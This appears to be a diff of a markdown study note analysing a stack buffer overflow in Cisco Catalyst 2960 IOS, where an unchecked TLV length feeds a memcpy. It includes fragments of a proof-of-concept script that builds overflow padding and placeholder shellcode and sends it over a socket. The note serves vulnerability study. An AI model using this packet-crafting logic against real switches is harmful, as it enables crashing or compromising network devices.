@@ -1,10 +1,9 @@
 ### INTRODUCTION
-why is C2960 targeted by attacker/security research?
+why is C2960 targeted by attackers/security researchers?
 * affordable and wide spread model
 
 what is the main characteristic of C2960 to be easy to exploit?
-* there're features listed online but one important feature of Cisco IOS is its behavior in case an exception condition occurs
-* if something goes wrong, Cisco IOS reboots a device
+* there're features listed online but one important feature of Cisco IOS is its behavior in case an exception condition occurs if something goes wrong, Cisco IOS reboots a device
 
 ### REVISION
 what is buffer?
@@ -62,11 +61,13 @@ what is watchdog?
     con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
     con.connect((options.target, options.port)) 
 
-    payload = 'BBBB' * 44  shellcode = 'D' * 2048 
+    payload = 'BBBB' * 44  
+    shellcode = 'D' * 2048 
 
     data = 'A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payload 
 
-    tlv_1 = craft_tlv(0x00000001, data)  tlv_2 = shellcode 
+    tlv_1 = craft_tlv(0x00000001, data)  
+    tlv_2 = shellcode 
 
     hdr =  '\x00\x00\x00\x01'                                   # msg_from
     hdr += '\x00\x00\x00\x01'                                   # version
@@ -128,22 +129,23 @@ what is tlv?
   R6: ptr to the TLV data <br/>
 
 ### LOGIC AND THE EXACT PLACE OF EXPLOIT
+
 Focus 1:
+``if (tlv_type == 1) {``
+  ``#read tlv_length information``
+``}``
+
+Focus 2:
+`if(tlv_length != 0) {`
+  `#size = tlv_length     <-----(LOOPHOLE) NO VALIDATION CHECK`
+`}
+
+Focus 3:
 `if (size != 0) {`
  `do {`
    `memcpy (src, dest, size);`
    `size-=1;`
  `}while (size!=0)`
-`}`
-
-Focus 2:
-``if (tlv_type == 1) {``
-  ``#read tlv_length information``
-``}``
-
-Focus 3:
-`if(tlv_length != 0) {`
-  `#size = tlv_length     <-----(LOOPHOLE) NO VALIDATION CHECK`
 `}`
 
 * size is saved as a parameter for later memcpy (src, dest, size)
@@ -154,8 +156,6 @@ Focus 3:
 
 ### BEFORE AND AFTER BUFFER OVERFLOW IN LOW-LEVEL
 ![from the code logic](https://user-images.githubusercontent.com/23307275/39845862-de324c8a-542a-11e8-9df2-02a10f7cfb7d.PNG)
-
-
 
   R3 is the buffer length of 0x58 #dst <br/>
   R4 is the content of the TlL data #scr <br/>
@@ -171,11 +171,9 @@ Focus 3:
 * the figure above shows that the contents of 0xd8 bytes starting from 0x318e890 will be copied into the buffers starting from 0x3df24a8 in the stack frame.
 
 <br/>
-![after overflow](https://user-images.githubusercontent.com/23307275/39846025-f5b87400-542b-11e8-8d67-51016f3d2b5c.PNG)
-<br/>
+![after overflow](https://user-images.githubusercontent.com/23307275/39849799-a6205f1a-5440-11e8-9dd5-3886c3cb1da3.PNG)
 
-* the above figure shows the contents of the function stack frame after the memcpy operation. The stack frame of this function is 0x58 bytes in size.
-Obviously, the buffer overflow has already occurred. After the function is overwritten by 0x42424242, the pointer of the execution code area is skipped. At this point, the buffer overflow process has been analyzed.
+* the above figure shows the contents of the function stack frame after the memcpy operation. The stack frame of this function is 0x58 bytes in size. After the function is overwritten by 0x42424242, the pointer of the execution code area is skipped resulting a buffer overflow situation. 
 
 * the content of the register changes along with the CPU instructions
 * register is a small set of data holding places that are part of the computer processor
